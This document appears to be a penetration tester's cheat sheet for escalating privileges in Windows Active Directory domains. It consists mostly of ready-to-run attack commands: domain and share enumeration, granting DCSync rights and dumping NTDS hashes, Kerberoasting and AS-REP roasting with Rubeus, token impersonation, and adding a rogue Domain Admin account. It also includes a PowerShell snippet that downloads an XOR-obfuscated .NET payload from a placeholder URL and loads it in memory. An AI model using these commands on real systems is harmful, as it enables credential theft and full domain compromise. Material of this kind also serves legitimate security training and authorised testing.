# Domain escalation

## Tools

- [Bloodhound](https://github.com/BloodHoundAD/BloodHound) with [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
- [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)

> After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"

```bash
enum4linux -a <target_dc> -u <USER> -p <PASSWORD> -d <domain>
bloodhound.py -d <DOMAIN> -u <user> -p <password> -dc <FQDN-SERVER> -c all
python ldapdomaindump.py -u '<domain>\<user>' -p '<pass>' <target>
sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
```

---


## **Domain enum**






Get DC IP

```bash
cat /etc/resolv.conf
nslookup <domain>
```

Password policy \(especially lockout threshold for bruteforce\)

```bash
enum4linux -P -o <target>
enum4linux -a <target>
```

### Open shares \(anonymous SMB, NFS, FTP, etc\)

SMB open shares

```bash
smbmap -H IP -r DOSSIER
smbmap -H IP --download DOSSIER

# SMB V1
smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]
```

SMB restricted shares

```bash
smbmap -P 445 -H <target> -u '<user>' -p '<pass>' 
smbget -rR smb://<target>/<share>/ -U <user>
smbclient \\\\<target>\\c$ -U <user>
smbclient -L //<target> -U '<domain>\<user>`
upload .ico .scf => Responder/NTLMrelayx
```


NFS 

```bash
showmount -e <target>
mount <target>:/home/xx /mnt/yy 
```

---

## ACLs
Get ACL

```bash
Get-DomainObjectAcl -Identity <username> -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID <domain>) }
```

add DCSync

```bash
Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<local>" -PrincipalIdentity <username> -Rights DCSync
```

dump ntds 

```bash
meterpreter > dcsync_ntlm <DOMAIN>\<user>
```

## Kerbrute AS-REP

```bash
nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/root/users.txt 10.10.10.169
./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
```

---

## Impersonation Token 

### Tools
- [Rubeus.exe](https://github.com/GhostPack/Rubeus) (DOTNET CSHARP)
- [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (DOTNET CSHARP)
- [Incognito.exe](https://github.com/FSecureLABS/incognito) (Meterpreter extension)
- [TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

Reflectively load DOTNET CSHARP Assembly within Powershell (or Cobalt, SilentTrinity etc.) if you cant do it through your C2 Infra :

```powershell
$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-bxor$k[$i++%$k.length]}
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters=@("arg1", "arg2")
[namespace.Class]::Main($parameters)
```

---

### Kerberos impersonate

Find domain admin accounts 

```bat
net group "Domain Admins" /DOMAIN
net group "Admins du domaine" /DOMAIN
```

Find if one is loggedon somewhere :

```bash
crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --loggedon-users
bloodhound.py -d <domain> -u <user> -p <password> -ns <IP-DC> -c LoggedOn
```

Impersonate kerberos token

```bat
# Rubeus
Rubeus.exe klist
Rubeus.exe dump
Rubeus.exe kerberoast /outfile:roasted_hashes.txt
Rubeus.exe asreproast /outfile:asrep_hashes.txt
Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI>

#TokenManipulation
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"


# Incognito loaded by Meterpreter
load incognito 
list_tokens -u
impersonate_token <domain>\\<user> # Double slash is mandatory !

# Incognito standalone executable
Incognito.exe

# CrackMapExec using kerberos ticket
export KRB5CCNAME=<user>.ccache 
sudo cme smb <target> --kerberos -x whoami
```

Create new Domain Admin account 

```bat
net user add <user> <pass> /domain
net group "Domain Admins" <user> /add
```

Check if a computer has the TrustedForDelegation flag enabled

```powershell
Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
```

---

### Manual testing

- [secureauth.com](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)

### Delegation Explained

- [specterops.io](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)